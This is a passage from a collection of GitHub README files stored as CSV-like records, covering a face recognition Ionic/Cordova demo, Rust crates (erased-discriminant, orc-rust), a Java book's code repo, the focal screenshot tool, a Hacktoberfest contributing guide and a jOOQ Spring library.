  | 8        | [Face Attribute - Android](https://github.com/kby-ai/FaceAttribute-Android)        | Premium SDK |
  | 9        | [Face Attribute - iOS](https://github.com/kby-ai/FaceAttribute-iOS)        | Premium SDK |
  | 10        | [Face Attribute - Flutter](https://github.com/kby-ai/FaceAttribute-Flutter)        | Premium SDK |

 > To get `Face SDK(server)`, please visit products [here](https://github.com/kby-ai/Product).<br/>

## Try with Demo App

### Google Play

<a href=""https://play.google.com/store/apps/details?id=com.kbyai.facerecognition"" target=""_blank"">
  <img alt="""" src=""https://user-images.githubusercontent.com/125717930/230804673-17c99e7d-6a21-4a64-8b9e-a465142da148.png"" height=80/>
</a>

### App Store

<a href=""https://apps.apple.com/us/app/kby-ai-face-recognition/id6448648922"" target=""_blank"">
  <img alt="""" src=""https://user-images.githubusercontent.com/125717930/235276083-d20fe057-214d-497c-a431-4569bbeed2fe.png"" height=80/>
</a>

## Performance Video

You can visit our YouTube video [here](https://www.youtube.com/watch?v=M7t_dpT-hOI) to see how well our demo app works.</br>
[![Face Recognition Android](https://img.youtube.com/vi/M7t_dpT-hOI/0.jpg)](https://www.youtube.com/watch?v=M7t_dpT-hOI)

## Screenshots
<p float=""left"">
  <img src=""https://github.com/kby-ai/FaceRecognition-Flutter/assets/125717930/724fa0e5-7d32-45f4-9d63-c192e79c15a0"" width=200/>
  <img src=""https://github.com/kby-ai/FaceRecognition-Flutter/assets/125717930/ea7f4653-10dc-45d4-a00c-2ae65cfd678b"" width=200/>
  <img src=""https://github.com/kby-ai/FaceRecognition-Flutter/assets/125717930/f1b0a0cd-5e5d-4b03-9dae-a1d3839eb8ee"" width=200/>
</p>

<p float=""left"">
  
  <img src=""https://github.com/kby-ai/FaceRecognition-Flutter/assets/125717930/cd8d4643-cbca-4fc5-b239-574383bbdc88"" width=200/>
  <img src=""https://github.com/kby-ai/FaceRecognition-Flutter/assets/125717930/763dd8fa-2463-4534-9497-370b4a9dfd62"" width=200/>
  <img src=""https://github.com/kby-ai/FaceRecognition-Flutter/assets/125717930/26f1c3aa-d90a-4935-af8a-bff6741bbefc"" width=200/>
</p>

## SDK License

This repo integrated `KBY-AI`'s `face recognition SDK`, which requires a license for each `application ID`.</br>
- The code below shows how to use the license: https://github.com/kby-ai/FaceRecognition-Ionic-Cordova/blob/5f9671ac889d4f8bb6739bac54c538e76ac5f9db/src/app/home/home.page.ts#L14-L62

- To request a license, please contact us:</br>
üßô`Email:` contact@kby-ai.com</br>
üßô`Telegram:` [@kbyai](https://t.me/kbyai)</br>
üßô`WhatsApp:` [+19092802609](https://wa.me/+19092802609)</br>
üßô`Skype:` [live:.cid.66e2522354b1049b](https://join.skype.com/invite/OffY2r1NUFev)</br>
üßô`Facebook:` https://www.facebook.com/KBYAI</br>

## How To Run
### 1. Prerequisites
#### Node.js and npm:

- You can download and install from `Node.js` website.
After installation, verify by running:

```bash
node -v
npm -v
```
#### Ionic CLI: Install the Ionic CLI globally with npm:
```bash
npm install -g @ionic/cli
```

#### Cordova CLI: You also need Cordova installed globally:
```bash
npm install -g cordova
```

### 2. Running the Android App
  <b>Add `FacePlugin` to the Project</b></br>Run the following command to add the `FacePlugin` to your `Ionic Cordova` project:
  
  ```bash
  ionic cordova plugin add ./FacePlugin  
  ```  
  <b>Build the `Android` App</b></br>After adding the plugin, build the `Android` app:
  ```bash
  ionic cordova build android
  ```
  <b>Add `Camera Permission`</b></br>To allow camera access, add the following permission to the `AndroidManifest.xml` placed in `platforms/android/app/src/main`:
  ```xml
  <uses-permission android:name=""android.permission.CAMERA"" />
  ```
  <b>Run the Android App</b></br>Once the permission is added and the app is built, you can run it on an `Android` device:
  ```bash
  ionic cordova run android
  ```
### 3. Running the iOS App
  <b>Add `FacePlugin` To The Project</b></br>Run the following command to add the `FacePlugin` to the project:
  ```bash
  ionic cordova plugin add ./FacePlugin
  ```
  <b>Add the `iOS` Platform</b></br>
  ```bash
  ionic cordova platform add ios
  ```
  <b>Prepare the `iOS` Project</b></br>
  ```bash
  ionic cordova prepare ios
  ```
  <b>Add `Camera Permission` to `Info.plist`</b><br/>Open the `iOS` workspace in `Xcode`:
  ```bash
  open platforms/ios/face-recognition.xcworkspace
  ```
  Then, navigate to the file `Info.plist` in `Xcode` and add the following entry to request camera permission:
  ```xml
  <key>NSCameraUsageDescription</key>
  <string>We need access to your camera for face recognition.</string>
  ```
  Build the app with `Xcode` and run it on a real `iOS` device, not simulator.

",0,0,1,,,0.0
dtolnay/erased-discriminant,master,"# Type-erased `Discriminant`

[<img alt=""github"" src=""https://img.shields.io/badge/github-dtolnay/erased--discriminant-8da0cb?style=for-the-badge&labelColor=555555&logo=github"" height=""20"">](https://github.com/dtolnay/erased-discriminant)
[<img alt=""crates.io"" src=""https://img.shields.io/crates/v/erased-discriminant.svg?style=for-the-badge&color=fc8d62&logo=rust"" height=""20"">](https://crates.io/crates/erased-discriminant)
[<img alt=""docs.rs"" src=""https://img.shields.io/badge/docs.rs-erased--discriminant-66c2a5?style=for-the-badge&labelColor=555555&logo=docs.rs"" height=""20"">](https://docs.rs/erased-discriminant)
[<img alt=""build status"" src=""https://img.shields.io/github/actions/workflow/status/dtolnay/erased-discriminant/ci.yml?branch=master&style=for-the-badge"" height=""20"">](https://github.com/dtolnay/erased-discriminant/actions?query=branch%3Amaster)

This crate provides a `Discriminant` type that behaves like
`core::mem::Discriminant<T>` but without the generic type parameter `T`. With
this, we can build collections such as HashSet that contain discriminants from a
mixture of different enum types.

```rust
use erased_discriminant::Discriminant;
use std::collections::HashSet;

enum Enum {
    A(i32),
    B,
}

enum DifferentEnum {
    A,
}

let mut set = HashSet::new();
set.insert(Discriminant::of(&Enum::A(99)));
set.insert(Discriminant::of(&Enum::B));
set.insert(Discriminant::of(&DifferentEnum::A));
assert_eq!(set.len(), 3);
```

<br>

#### License

<sup>
Licensed under either of <a href=""LICENSE-APACHE"">Apache License, Version
2.0</a> or <a href=""LICENSE-MIT"">MIT license</a> at your option.
</sup>

<br>

<sub>
Unless you explicitly state otherwise, any contribution intentionally submitted
for inclusion in this crate by you, as defined in the Apache-2.0 license, shall
be dual licensed as above, without any additional terms or conditions.
</sub>
",0,0,1,Apache-2.0,ci.yml,1.0
chriskiehl/Data-Oriented-Programming-In-Java-Book,main,"# Data Oriented Programming in Java

Source code for the book Data Oriented Programming in Java (by me! Chris Kiehl!)

<p align=""center"">
    <img src=""https://freecontent.manning.com/wp-content/uploads/DOTD_NewMEAP_Kiehl.png"" />
</p>

* [Get the book here!](https://mng.bz/BgQv)
* ISBN: 9781633436930

> [!Note]
> This book is in Early Access while I continue to work on it. This repository will be updated as new chapters are released.

This book is a distillation of everything I‚Äôve learned about what effective development looks like in Java (so far!). It‚Äôs what‚Äôs left over after years of experimenting, getting things wrong (often catastrophically), and
slowly having anything resembling ‚Äúdevotion to a single paradigm‚Äù beat out of me by the great humbling filter that is reality.

Data-orientation doesn't replace object orientation. The two work together and enhance each other. DoP is born from a very simple idea, and one that people have been repeatedly rediscovering since the dawn of computing: ‚Äúrepresentation is the essence of programming‚Äù. Programs that are organized around the data they manage tend to be simpler, smaller, and significantly easier understand. When we do a really good job of capturing the data in our domain, the rest of the system tends to fall into place in a way which can feel like it‚Äôs writing itself.

## Getting Started with this project

To download a copy of this repository, click on the [Download ZIP](https://github.com/chriskiehl/Data-Oriented-Programming-In-Java-Book/archive/refs/heads/main.zip) button or execute the following command in your terminal:

```
git clone https://github.com/chriskiehl/Data-Oriented-Programming-In-Java-Book.git
```

(If you downloaded the code bundle from the Manning website, please consider visiting the official code repository on GitHub at https://github.com/chriskiehl/Data-Oriented-Programming-In-Java-Book for the latest updates.)

The project is built with [Gradle](https://gradle.org/).

```
gradle build
```

### Running the code

The `tests/` package houses all of the runnable code. You can run all the tests in a class with this command:

```
gradle test --tests 'path.to.test.Class'
```
e.g.
```
gradle test --tests 'dop.chapter02.Listings'
```

You can also run individual tests by specifying the method.

```
gradle test --tests 'dop.chapter02.Listings.listing_2_1'
```



### How to use this repository

Each chapter in the book has an associated package in the `src/test/` directory. Most of the examples aren't necessarily things that we'll run. They're primarily for study. We'll look at them and go ""Hmm. Interesting."" DoP is a book that's about design decisions and how they affect our code. We're striving to make incorrect states impossible to express or compile. Thus, a lot of the examples are exploring how code changes (or _disappears_ entirely) when we get our modeling right.

**Listings in the Book vs Code**

Each listing in the book will have a corresponding example in the code. The Javadoc will describe which listing the code applies to.

```
/**
* ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
*                      Listing 1.1
* ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
*
* Here's an example of how we might traditionally model
* data ""as data"" using a Java object.
* ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
*/
```

Sometimes, separate listings in the book will be combined into one example in the code.

```
/**
 * ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 *                Listings 1.5 through 1.9
 * ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 * Representation affects our ability to understand the code
 * as a whole. [...]
 * ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 */
```

> [!Note]
> The class names in the code will often differ from the class names used in the book. Java doesn't let us redefine classes over and over again (which we do in the book as we refactor), so we 'cheat' by appending a qualifying suffix. For instance, `ScheduledTask` in listing A might become `ScheduledTaskV2` or `ScheduledTaskWithBetterOOP` in a subsequent example code. The listing numbers in the Javadoc will always tie to the Listing numbers in the book.


**Character Encodings**

Make sure your IDE / Text editor is configured for UTF-8 character encoding (Windows tends to default to other encodings). Many of the in-code diagrams leverage the utf-8 charset.

Example utf-8 diagram:
```
// An informational black hole!
//
//  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ  It returns nothing!
//  ‚ñº
// void reschedule( ) {   //  ‚óÑ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
//     ...         ‚ñ≤                                            ‚îÇ Compare how very different
// }               ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ It takes nothing!                    ‚îÇ these two methods are in
//                                                              ‚îÇ terms of what they convey
RetryDecision reschedule(FailedTask failedTask) {       //  ‚óÑ‚îÄ‚îÄ‚îÄ‚îò to us as readers
    // ...
}
```


## Table of Contents

| Chapter                                                   | Code Listings                                                                                                                                 | 
|-----------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------|
| Chapter 01 - Data Oriented Programming                    | [Listings.java](https://github.com/chriskiehl/Data-Oriented-Programming-In-Java-Book/blob/main/app/src/test/java/dop/chapter01/Listings.java) |
| Chapter 02 - Data, Identity, and Values                   | [Listings.java](https://github.com/chriskiehl/Data-Oriented-Programming-In-Java-Book/blob/main/app/src/test/java/dop/chapter02/Listings.java) |
| Chapter 03 - Data and Meaning                             | [Listings.java](https://github.com/chriskiehl/Data-Oriented-Programming-In-Java-Book/blob/main/app/src/test/java/dop/chapter03/Listings.java) |
| Chapter 04 - Representation is the Essence of Programming | [Listings.java](https://github.com/chriskiehl/Data-Oriented-Programming-In-Java-Book/blob/main/app/src/test/java/dop/chapter04/Listings.java) |
| Chapter 05 - Coming soon!                                 | Coming soon!                                                                                                                                  |


## Questions and Feedback

I'd love to hear any and all feedback. You can leave comments in the [Manning forum](https://livebook.manning.com/forum?product=kiehl&page=1). I'm also very responsive to emails. If you have a question about the repo, feel free to write me at me@chriskiehl.com. 





",0,0,2,MIT,,0.0
datafusion-contrib/orc-rust,main,"[![test](https://github.com/datafusion-contrib/datafusion-orc/actions/workflows/ci.yml/badge.svg)](https://github.com/datafusion-contrib/datafusion-orc/actions/workflows/ci.yml)
[![codecov](https://codecov.io/gh/WenyXu/orc-rs/branch/main/graph/badge.svg?token=2CSHZX02XM)](https://codecov.io/gh/WenyXu/orc-rs)
[![Crates.io](https://img.shields.io/crates/v/orc-rust)](https://crates.io/crates/orc-rust)
[![Crates.io](https://img.shields.io/crates/d/orc-rust)](https://crates.io/crates/orc-rust)

# orc-rust

A native Rust implementation of the [Apache ORC](https://orc.apache.org) file format,
providing API's to read data into [Apache Arrow](https://arrow.apache.org) in-memory arrays.

See the [documentation](https://docs.rs/orc-rust/latest/orc_rust/) for examples on how to use this crate.

## Supported features

This crate currently only supports reading ORC files into Arrow arrays. Write support is planned
(see [Roadmap](#roadmap)). The below features listed relate only to reading ORC files.
At this time, we aim to support the [ORCv1](https://orc.apache.org/specification/ORCv1/) specification only.

- Read synchronously & asynchronously (using Tokio)
- All compression types (Zlib, Snappy, Lzo, Lz4, Zstd)
- All ORC data types
- All encodings
- Rudimentary support for retrieving statistics
- Retrieving user metadata into Arrow schema metadata

## Roadmap

The long term vision for this crate is to be feature complete enough to be donated to the
[arrow-rs](https://github.com/apache/arrow-rs) project.

The following lists the rough roadmap for features to be implemented, from highest to lowest priority.

- Performance enhancements
- Predicate pushdown
- Row indices
- Bloom filters
- Write from Arrow arrays
- Encryption

A non-Arrow API interface is not planned at the moment. Feel free to raise an issue if there is such
a use case.

## Version compatibility

No guarantees are provided about stability across versions. We will endeavour to keep the top level API's
(`ArrowReader` and `ArrowStreamReader`) as stable as we can, but other API's provided may change as we
explore the interface we want the library to expose.

Versions will be released on an ad-hoc basis (with no fixed schedule).

## Mapping ORC types to Arrow types

The following table lists how ORC data types are read into Arrow data types:

| ORC Data Type     | Arrow Data Type             | Notes |
| ----------------- | --------------------------- | ----- |
| Boolean           | Boolean                     |       |
| TinyInt           | Int8                        |       |
| SmallInt          | Int16                       |       |
| Int               | Int32                       |       |
| BigInt            | Int64                       |       |
| Float             | Float32                     |       |
| Double            | Float64                     |       |
| String            | Utf8                        |       |
| Char              | Utf8                        |       |
| VarChar           | Utf8                        |       |
| Binary            | Binary                      |       |
| Decimal           | Decimal128                  |       |
| Date              | Date32                      |       |
| Timestamp         | Timestamp(Nanosecond, None) | ¬π     |
| Timestamp instant | Timestamp(Nanosecond, UTC)  | ¬π     |
| Struct            | Struct                      |       |
| List              | List                        |       |
| Map               | Map                         |       |
| Union             | Union(_, Sparse)            | ¬≤     |

¬π: `ArrowReaderBuilder::with_schema` allows configuring different time units or decoding to
`Decimal128(38, 9)` (i128 of non-leap nanoseconds since UNIX epoch).
Overflows may happen while decoding to a non-Seconds time unit, and results in `OrcError`.
Loss of precision may happen while decoding to a non-Nanosecond time unit, and results in `OrcError`.
`Decimal128(38, 9)` avoids both overflows and loss of precision.

¬≤: Currently only supports a maximum of 127 variants

## Contributing

All contributions are welcome! Feel free to raise an issue if you have a feature request, bug report,
or a question. Feel free to raise a Pull Request without raising an issue first, as long as the Pull
Request is descriptive enough.

Some tools we use in addition to the standard `cargo` that require installation are:

- [taplo](https://taplo.tamasfe.dev/)
- [typos](https://crates.io/crates/typos)

```shell
cargo install typos-cli
cargo install taplo-cli
```

```shell
# Building the crate
cargo build

# Running the test suite
cargo test

# Simple benchmarks
cargo bench

# Formatting TOML files
taplo format

# Detect any typos in the codebase
typos
```

To regenerate/update the [proto.rs](src/proto.rs) file, execute the [regen.sh](regen.sh) script.

```shell
./regen.sh
```

",1,23,2,Apache-2.0,ci.yml,11.0
iynaix/focal,main,"# focal

focal is a rofi menu for capturing and copying screenshots or videos on hyprland / sway.

<!-- 93859049_p0.webp -->
<img src=""https://i.imgur.com/3DrXV0I.png"" alt=""main menu"" width=""49%"" /> <img src=""https://i.imgur.com/3kKoNJv.png"" alt=""delay menu"" width=""49%"" />
<img src=""https://i.imgur.com/5NXnkKm.png"" alt=""selection"" width=""49%"" /> <img src=""https://i.imgur.com/sm7PJgw.png"" alt=""selection"" width=""49%"" />
<br/>
<em>Wallpaper made by the awesome <a href=""https://www.pixiv.net/en/users/2993192"">Rosuuri</a></em>

## Features

- rofi menu to select area / window / entire screen to capture
- rofi menu to select delay before capture
- image / video is automatically copied to clipboard, ready for pasting into other programs
- notifications that open captured file when clicked
- all options are also available via the CLI
- supports either hyprland or sway
- OCR support to select text from captured image (CLI only)

## Installation

### NixOS
```nix
{
  inputs.focal = {
    url = ""github:iynaix/focal"";
    inputs.nixpkgs.follows = ""nixpkgs""; # override this repo's nixpkgs snapshot
  };
}
```

Then, include it in your `environment.systemPackages` or `home.packages` by referencing the input:
```nix
# for hyprland
inputs.focal.packages.${pkgs.system}.default
# for sway
inputs.focal.packages.${pkgs.system}.focal-sway
```

Alternatively, it can also be run directly:

```sh
# for hyprland
nix run github:iynaix/focal
# for sway
nix run github:iynaix/focal#focal-sway
```

OCR support can be optionally disabled through the use of an override:
```nix
(inputs.focal.packages.${pkgs.system}.default.override { ocr = false; })
```

### Arch Linux

Arch Linux users can install from the [AUR](https://aur.archlinux.org/) or [AUR-git](https://aur.archlinux.org/packages/focal-hyprland-git).

```sh
# for hyprland
paru -S focal-hyprland-git
# for sway
paru -S focal-sway-git
```

## Usage

```console
$ focal --help
focal is a rofi menu for capturing and copying screenshots or videos on hyprland / sway.

Usage: focal image [OPTIONS] <--rofi|--area <AREA>|--selection|--monitor|--all> [FILE]
       focal video [OPTIONS] <--rofi|--area <AREA>|--selection|--monitor|--stop> [FILE]
       focal help [COMMAND]...

Options:
  -h, --help     Print help
  -V, --version  Print version

focal image:
Captures a screenshot.
  -a, --area <AREA>         Type of area to capture [aliases: capture] [possible values: monitor, selection, all]
      --selection
      --monitor
      --all
      --freeze              Freezes the screen before selecting an area.
  -t, --delay <DELAY>       Delay in seconds before capturing
  -s, --slurp <SLURP>       Options to pass to slurp
      --no-rounded-windows  Do not show rounded corners when capturing a window. (Hyprland only)
      --no-notify           Do not show notifications
      --no-save             Do not save the file permanently
      --rofi                Display rofi menu for selection options
      --no-icons            Do not show icons for rofi menu
      --theme <THEME>       Path to a rofi theme
  -e, --edit <COMMAND>      Edit screenshot using COMMAND
                            The image path will be passed as $IMAGE
      --ocr [<LANG>]        Runs OCR on the selected text
  -h, --help                Print help (see more with '--help')
  [FILE]                Files are created in XDG_PICTURES_DIR/Screenshots if not specified

focal video:
Captures a video.
  -a, --area <AREA>         Type of area to capture [aliases: capture] [possible values: monitor, selection]
      --selection
      --monitor
  -t, --delay <DELAY>       Delay in seconds before capturing
  -s, --slurp <SLURP>       Options to pass to slurp
      --no-rounded-windows  Do not show rounded corners when capturing a window. (Hyprland only)
      --no-notify           Do not show notifications
      --no-save             Do not save the file permanently
      --rofi                Display rofi menu for selection options
      --no-icons            Do not show icons for rofi menu
      --theme <THEME>       Path to a rofi theme
      --stop                Stops any previous video recordings
      --audio [<DEVICE>]    Capture video with audio, optionally specifying an audio device
      --duration <SECONDS>  Duration in seconds to record
  -h, --help                Print help (see more with '--help')
  [FILE]                Files are created in XDG_VIDEOS_DIR/Screencasts if not specified

focal help:
Print this message or the help of the given subcommand(s)
  [COMMAND]...  Print help for the subcommand(s)
```

> [!TIP]
> Invoking `focal video` a second time stops any currently recording videos.

Example usage as a **hyprland** keybinding:
```
bind=$mainMod, backslash, exec, focal image --area selection
```

Similarly, for a **sway** keybinding:
```
bindsym $mod+backslash exec ""focal image --area selection""
```

### Optional Waybar Module

An optional `focal-waybar` script is available for [waybar](https://github.com/Alexays/Waybar) to indicate when a recording is in progress.

```console
$ focal-waybar --help
Updates waybar module with focal's recording status.

Usage: focal-waybar [OPTIONS]

Options:
      --recording <MESSAGE>  Message to display in waybar module when recording [default: REC]
      --stopped <MESSAGE>    Message to display in waybar module when not recording [default: ]
  -h, --help                 Print help
  -V, --version              Print version
```

Create a custom waybar module similar to the following:

```jsonc
{
  ""custom/focal"": {
    ""exec"": ""focal-waybar --recording 'REC'"",
    ""format"": ""{}"",
    // interval to poll for updated recording status
    ""interval"": 1,
    ""on-click"": ""focal video --stop"",
  },
}
```

focal video recordings can then be started / stopped using keybindings such as:

**hyprland**:
```
bind=$mainMod, backslash, exec, focal video --rofi --audio
```

**sway**:
```
bindsym $mod+backslash exec ""focal video --rofi --audio""
```

## Packaging

To build focal from source

- Build dependencies
    * Rust (cargo, rustc)
- Runtime dependencies
    * [grim](https://sr.ht/~emersion/grim/)
    * [slurp](https://github.com/emersion/slurp)
    * [hyprland](https://hyprland.org/)
    * [sway](https://swaywm.org/)
    * [rofi-wayland](https://github.com/lbonn/rofi)
    * [wl-clipboard](https://github.com/bugaevc/wl-clipboard)
    * [wf-recorder](https://github.com/ammen99/wf-recorder)
    * [ffmpeg](https://www.ffmpeg.org/)

## Hacking

Just use `nix develop`",0,0,1,MIT,,1.0
Ayush7-BIT/turbo-robot,main,"# Contributing to turbo-robot

Welcome to the turbo-robot! We‚Äôre glad you‚Äôre here to contribute to a growing collection of essential coding algorithms and famous code solutions. Whether you‚Äôre here for Hacktoberfest or to enhance this repository, we appreciate your efforts!

Getting Started

How to Contribute:

	1.	Fork the repository: Click the ‚ÄòFork‚Äô button at the top-right corner of this page to create a copy of this repository on your GitHub account.

	2.	Clone the repository: Use the command below to clone the forked repository to your local machine:

        git clone https://github.com/your-username/repository-name.git

    3.  Create a new branch: It‚Äôs recommended to work in a new branch for each contribution.

        git checkout -b feature-branch

    4.  Make your changes: Add new algorithms or enhance the existing ones. Be sure to write clean and well-documented code.

	5.	Commit your changes: Write meaningful commit messages that describe your changes clearly.

        git commit -m ""Added [algorithm name] or Improved [functionality]""

    6.  Push your branch: Push your branch to your forked GitHub repository.
    
        git push origin feature-branch

    7.	Create a Pull Request: Navigate to this repository on GitHub, click ‚ÄúNew Pull Request,‚Äù and follow the prompts.

    What We Expect:

	‚Ä¢	Clarity: Make sure your code is well-documented with comments and follows consistent formatting.
	‚Ä¢	Efficiency: Algorithms should be optimized for performance, with explanations if needed.
	‚Ä¢	Readability: Ensure your code is easy to understand for other contributors or learners.
	‚Ä¢	Tested Code: Please test your contributions before submitting a Pull Request (PR).

Contribution Guidelines

	‚Ä¢	Ensure that your code or improvements are not already present in the repository. Check existing contributions before adding your own.
	‚Ä¢	Each algorithm should have a brief description of its purpose, time complexity, and use cases in the code comments or as a markdown file (if necessary).
	‚Ä¢	No plagiarized content. Always provide credit if you use or adapt existing solutions.
	‚Ä¢	Contributions should focus on common algorithms (e.g., sorting, searching, dynamic programming) or well-known problems (e.g., Fibonacci series, factorial) that can help others prepare for interviews or coding challenges.

Hacktoberfest Participation

This repository is part of Hacktoberfest 2024 üéâ! Feel free to contribute as part of your Hacktoberfest journey by:

	‚Ä¢	Adding new algorithms or improving existing ones.
	‚Ä¢	Fixing bugs or optimizing the current code.
	‚Ä¢	Enhancing documentation or examples.

Note: Make sure your contributions follow the Hacktoberfest guidelines to be counted towards your total. Contributions will only be accepted if they meet the quality standards set by the Hacktoberfest rules.


Need Help?

If you have any questions, feel free to create an issue on GitHub, and we‚Äôll be happy to assist you.

Happy coding! üöÄ

This will guide contributors in understanding your repository‚Äôs requirements and encourage them to participate in Hacktoberfest. Let me know if you‚Äôd like any adjustments!
",0,121,1,,gradle-publish.yml,502.0
martinellich/jooq-spring,develop,"# jOOQ Spring Integration

**jooq-spring** is a small open-source library that provides integration of [jOOQ](https://www.jooq.org) with
the [Spring Framework](https://spring.io/projects/spring-framework).

## Dependency

Add a dependency to the current version:

```xml

<dependency>
    <groupId>ch.martinelli.oss</groupId>
    <artifactId>jooq-spring</artifactId>
    <version>0.4.0</version>
</dependency>
```

## Components

### JooqDAO

The JooqDAO follows the [DAO pattern](https://en.wikipedia.org/wiki/Data_access_object) and not
the [Repository pattern](https://martinfowler.com/eaaCatalog/repository.html) because the Repository is a pattern from
Domain Driven Design (DDD).

#### Usage

```java

@Component
public class AthleteDAO extends JooqDAO<Athlete, AthleteRecord, Long> {

    public AthleteDAO(DSLContext dslContext) {
        super(dslContext, ATHLETE);
    }
}
```

#### Methods

| Return Type   | Method                                                                                               | Description                                                                            |
|---------------|------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------|
| `Optional<R>` | `findById(ID id)`                                                                                    | Finds a record by its primary key.                                                     |
| `List<R>`     | `findAll(int offset, int limit, List<org.jooq.OrderField<?>> orderBy)`                               | Retrieves a list of records from the database with pagination and sorting.             |
| `List<R>`     | `findAll(org.jooq.Condition condition, int offset, int limit, List<org.jooq.OrderField<?>> orderBy)` | Retrieves a list of records from the database with filtering, pagination, and sorting. |
| `List<R>`     | `findAll(org.jooq.Condition condition, List<org.jooq.OrderField<?>> orderBy)`                        | Retrieves a list of records from the database with filtering, and sorting.             |
| `List<R>`     | `findAll(org.jooq.Condition condition)`                                                              | Retrieves a list of records from the database with filtering.                          |
| `int`         | `count()`                                                                                            | Counts the total number of records in the associated table.                            |
| `int`         | `count(org.jooq.Condition condition)`                                                                | Counts the number of records in the associated table that match the given condition.   |
| `int`         | `save(R record)`                                                                                     | Saves the given record to the database.                                                |
| `int[]`       | `saveAll(List<R> record)`                                                                            | Saves a list of records to the database using batch store operations.                  |
| `int`         | `merge(R record)`                                                                                    | Merges the given record into the database.                                             |
| `int`         | `deleteById(ID id)`                                                                                  | Deletes a record from the database identified by its primary key.                      |
| `int`         | `delete(R record)`                                                                                   | Deletes the specified record from the database.                                        |
| `int`         | `delete(org.jooq.Condition condition)`                                                               | Deletes records from the database that match the given condition.                      |

Check out the code documentation for further information [JooqDAO](src/main/java/ch/martinelli/oss/jooqspring/JooqDAO.java).

## License

**jooq-spring** is open and free software under Apache License, Version
2: http://www.apache.org/licenses/LICENSE-2.0.html
",2,0,3,Apache-2.0,"build.yml,publish.yml",1.0
cloudflare/entropy-map,main,"# entropy-map
![build](https://img.shields.io/github/actions/workflow/status/cloudflare/entropy-map/ci.yml?branch=main)
[![docs.rs](https://docs.rs/entropy-map/badge.svg)](https://docs.rs/entropy-map)
[![crates.io](https://img.shields.io/crates/v/entropy-map.svg)](https://crates.io/crates/entropy-map)
[![License](https://img.shields.io/badge/license-Apache%202.0-blue)](LICENSE)

